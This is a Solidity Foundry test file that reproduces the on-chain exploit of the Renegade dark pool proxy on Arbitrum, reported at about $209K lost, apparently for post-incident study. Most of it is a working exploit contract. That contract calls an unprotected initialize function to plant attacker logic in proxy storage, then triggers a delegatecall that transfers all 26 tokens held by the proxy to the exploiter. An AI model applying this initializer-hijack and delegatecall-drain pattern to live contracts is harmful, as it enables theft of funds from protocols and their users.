// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$209K
// Attacker : https://arbiscan.io/address/0x777253F28AdC29645152b7b41BE5c772A9657777
// Attack Contract : https://arbiscan.io/address/0x33FB722C76D4e9fC0c86BbF10EBDeA45a4434a34
// Vulnerable Contract : https://arbiscan.io/address/0x30bD8eAb29181F790D7e495786d4B96d7AfDC518
// Attack Tx : https://arbiscan.io/tx/0x0e494685ace16d372066c5b4db959b58ebac6d88166c2d9d618e0e421dc0c77e
//
// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0x30bD8eAb29181F790D7e495786d4B96d7AfDC518#code
//
// @Analysis
// Post-mortem : https://x.com/renegade_fi/status/2053531772634427599
// Twitter Guy : https://x.com/DefimonAlerts/status/2053538325969977801

contract RenegadeTest is Test {
    bytes32 internal constant TX_HASH = 0x0e494685ace16d372066c5b4db959b58ebac6d88166c2d9d618e0e421dc0c77e;
    address internal constant EXPLOITER = 0x777253F28AdC29645152b7b41BE5c772A9657777;
    address internal constant EXPLOIT_CONTRACT = 0x33FB722C76D4e9fC0c86BbF10EBDeA45a4434a34;
    address internal constant DARK_POOL_PROXY = 0x30bD8eAb29181F790D7e495786d4B96d7AfDC518;
    address internal constant STYLUS_IMPLEMENTATION = 0xC038933d0b33359f5C87B4B2f92Ee0DAd11EaDc5;
    IERC20 internal constant USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);

    function setUp() public {
        vm.createSelectFork("arbitrum", TX_HASH);
        vm.etch(STYLUS_IMPLEMENTATION, address(new RenegadeStylusInitializeShim()).code);
        vm.etch(EXPLOIT_CONTRACT, address(new RenegadeExploitContract()).code);
        vm.label(EXPLOITER, "Exploiter");
        vm.label(EXPLOIT_CONTRACT, "Renegade Exploit Contract");
        vm.label(DARK_POOL_PROXY, "Renegade Dark Pool Proxy");
        vm.label(STYLUS_IMPLEMENTATION, "Renegade Stylus Implementation Shim");
        vm.label(address(USDC), "USDC");
    }

    function testExploit() public {
        uint256 beforeUsdc = USDC.balanceOf(EXPLOITER);
        uint256[26] memory beforeProxyBalances;
        uint256[26] memory beforeExploiterBalances;

        for (uint256 i = 0; i < RenegadeTokenList.count(); i++) {
            address token = RenegadeTokenList.at(i);
            beforeProxyBalances[i] = IERC20(token).balanceOf(DARK_POOL_PROXY);
            beforeExploiterBalances[i] = IERC20(token).balanceOf(EXPLOITER);
        }

        vm.prank(EXPLOITER, EXPLOITER);
        RenegadeExploitContract(EXPLOIT_CONTRACT).attack();

        uint256 totalStolenUsdE8;
        for (uint256 i = 0; i < RenegadeTokenList.count(); i++) {
            address token = RenegadeTokenList.at(i);
            uint256 stolenAmount = IERC20(token).balanceOf(EXPLOITER) - beforeExploiterBalances[i];
            assertEq(stolenAmount, beforeProxyBalances[i], "unexpected drained token amount");
            assertEq(IERC20(token).balanceOf(DARK_POOL_PROXY), 0, "proxy token balance not drained");

            totalStolenUsdE8 += stolenAmount * RenegadeTokenList.usdPriceE8(i) / (10 ** RenegadeTokenList.decimals(i));
        }

        assertEq(USDC.balanceOf(EXPLOITER) - beforeUsdc, 104_383_594_837);
        assertGt(totalStolenUsdE8, 200_000e8, "USD value too low");
        assertLt(totalStolenUsdE8, 220_000e8, "USD value too high");
        console.log("Total stolen USD", totalStolenUsdE8 / 1e8);
    }
}

contract RenegadeExploitContract {
    address internal constant EXPLOITER = 0x777253F28AdC29645152b7b41BE5c772A9657777;
    IRenegadeDarkPool internal constant DARK_POOL = IRenegadeDarkPool(0x30bD8eAb29181F790D7e495786d4B96d7AfDC518);

    function attack() external {
        uint256[2] memory publicBlinder;

        DARK_POOL.initialize(
            address(this),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            address(0),
            0,
            publicBlinder,
            EXPLOITER
        );
        DARK_POOL.updateWallet("", "", "", "");
    }

    function drainTokens() external {
        for (uint256 i = 0; i < RenegadeTokenList.count(); i++) {
            address token = RenegadeTokenList.at(i);
            uint256 amount = IERC20(token).balanceOf(address(this));
            if (amount != 0) {
                require(IERC20(token).transfer(EXPLOITER, amount), "transfer failed");
            }
        }
    }
}

contract RenegadeStylusInitializeShim {
    bytes4 internal constant INITIALIZE_SELECTOR = 0x92413afe;
    bytes4 internal constant UPDATE_WALLET_SELECTOR = 0x803f430a;
    address internal injectedLogic;

    // The real implementation is Arbitrum Stylus code; Foundry/revm stops at
    // OpcodeNotFound there. Only the two selectors reached by the exploit tx are
    // shimmed: initialize stores attacker-controlled logic in proxy storage, and
    // updateWallet delegatecalls that logic from the proxy storage context.
    fallback() external {
        require(msg.sig == INITIALIZE_SELECTOR || msg.sig == UPDATE_WALLET_SELECTOR, "unexpected Renegade selector");

        if (msg.sig == INITIALIZE_SELECTOR) {
            injectedLogic = abi.decode(msg.data[4:], (address));
            return;
        }

        address logic = injectedLogic;
        require(logic != address(0), "missing injected logic");

        (bool ok, bytes memory ret) =
            logic.delegatecall(abi.encodeWithSelector(RenegadeExploitContract.drainTokens.selector));
        ret;
        require(ok, "injected delegatecall failed");
    }
}

interface IRenegadeDarkPool {
    function initialize(
        address injectedLogic,
        address verifier,
        address hasher,
        address transferExecutor,
        address permit2,
        address vkeys,
        address protocolFeeRecipient,
        address protocolFeeController,
        address relayer,
        address priceReporter,
        uint256 protocolFee,
        uint256[2] calldata publicBlinder,
        address owner
    ) external;

    function updateWallet(
        bytes calldata wallet,
        bytes calldata proof,
        bytes calldata statement,
        bytes calldata blinderSeed
    ) external;
}

library RenegadeTokenList {
    function count() internal pure returns (uint256) {
        return 26;
    }


    function decimals(uint256 index) internal pure returns (uint256) {
        if (index == 6) return 8;
        if (index == 18 || index == 25) return 6;
        return 18;
    }

    // Approximate USD prices with 8 decimals, used only to display the aggregate exploit value.
    function usdPriceE8(uint256 index) internal pure returns (uint256) {
        if (index == 1) return 1e8; // PENDLE
        if (index == 2) return 25_000_000; // CRV: $0.25
        if (index == 4) return 50_000_000; // LDO: $0.50
        if (index == 5) return 4e8; // LPT
        if (index == 6) return 100_000e8; // WBTC
        if (index == 8) return 1_000_000; // RDNT: $0.01
        if (index == 9) return 20e8; // COMP
        if (index == 11) return 1_500_000; // XAI: $0.015
        if (index == 13) return 1e8; // ZRO
        if (index == 14) return 50_000_000; // ETHFI: $0.50
        if (index == 15) return 2_400e8; // WETH
        if (index == 16) return 25_000_000; // ARB: $0.25
        if (index == 17) return 4_000_000; // GRT: $0.04
        if (index == 18) return 1e8; // USDC
        if (index == 20) return 80e8; // AAVE
        if (index == 22) return 8e8; // LINK
        if (index == 23) return 3e8; // UNI
        if (index == 24) return 8e8; // GMX
        if (index == 25) return 1e8; // USDT
        return 0;
    }

    function at(uint256 index) internal pure returns (address) {
        if (index == 0) return 0x0721b3C9f19cfeF1d622C918DcD431960f35E060;
        if (index == 1) return 0x0c880f6761F1af8d9Aa9C466984b80DAb9a8c9e8;
        if (index == 2) return 0x11cDb42B0EB46D95f990BeDD4695A6e3fA034978;
        if (index == 3) return 0x13ad3f1150db0e1e05fd32bDEeB7C110ee023de6;
        if (index == 4) return 0x13Ad51ed4F1B7e9Dc168d8a00cB3f4dDD85EfA60;
        if (index == 5) return 0x289ba1701C2F088cf0faf8B3705246331cB8A839;
        if (index == 6) return 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;
        if (index == 7) return 0x306fD3e7b169Aa4ee19412323e1a5995B8c1a1f4;
        if (index == 8) return 0x3082CC23568eA640225c2467653dB90e9250AaA0;
        if (index == 9) return 0x354A6dA3fcde098F8389cad84b0182725c6C91dE;
        if (index == 10) return 0x45D9831d8751B2325f3DBf48db748723726e1C8c;
        if (index == 11) return 0x4Cb9a7AE498CEDcBb5EAe9f25736aE7d428C9D66;
        if (index == 12) return 0x65C101E95D7DD475c7966330fa1A803205FF92aB;
        if (index == 13) return 0x6985884C4392D348587B19cb9eAAf157F13271cd;
        if (index == 14) return 0x7189fb5B6504bbfF6a852B13B7B82a3c118fDc27;
        if (index == 15) return 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
        if (index == 16) return 0x912CE59144191C1204E64559FE8253a0e49E6548;
        if (index == 17) return 0x9623063377AD1B27544C965cCd7342f7EA7e88C7;
        if (index == 18) return 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
        if (index == 19) return 0xb1425d5Bafc89A069421F69Ba57DBE2F23fC45f6;
        if (index == 20) return 0xba5DdD1f9d7F570dc94a51479a000E3BCE967196;
        if (index == 21) return 0xC5a861787f3e173F2b004d5cfA6a717f5DC5484D;
        if (index == 22) return 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4;
        if (index == 23) return 0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0;
        if (index == 24) return 0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a;
        if (index == 25) return 0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9;
        revert("token index out of bounds");
    }
}